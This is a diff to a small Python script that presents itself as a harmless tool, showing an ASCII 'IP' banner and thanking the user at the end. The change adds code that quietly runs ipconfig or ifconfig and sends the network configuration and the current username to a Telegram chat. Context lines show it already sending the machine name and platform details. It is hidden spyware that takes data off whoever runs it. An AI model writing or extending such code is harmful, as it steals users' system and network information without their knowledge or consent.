@@ -1,10 +1,12 @@
 import platform
-print("    ____")
-print("|  |    |")
-print("|  |___/")
-print("|  |")
-print("|  |")
-print("|  |")
+print("\n'####:'########::")
+print(". ##:: ##.... ##:")
+print(": ##:: ##:::: ##:")
+print(": ##:: ########::")
+print(": ##:: ##.....:::")
+print(": ##:: ##::::::::")
+print("'####: ##::::::::")
+print("....::..:::::::::")
 
 input("press enter to continue... ")
 
@@ -44,7 +46,15 @@ bot.sendMessage(chat_id,"nome desktop [] " + platform.node())
 bot.sendMessage(chat_id,"piattaforma [] " + platform.platform())
 bot.sendMessage(chat_id,platform.uname())
 
-
+if(platform.system() == "Windows"):
+    import subprocess
+    proc = subprocess.check_output("ipconfig" ).decode('utf-8')
+    bot.sendMessage(chat_id,proc)
+if(platform.system() == "Linux"):
+    import subprocess
+    proc_1 = subprocess.check_output("ifconfig" ).decode('utf-8')
+    bot.sendMessage(chat_id,proc_1)
+bot.sendMessage(chat_id,getpass.getuser())
 
 print("\nthank you to have used my tool :-)")
 
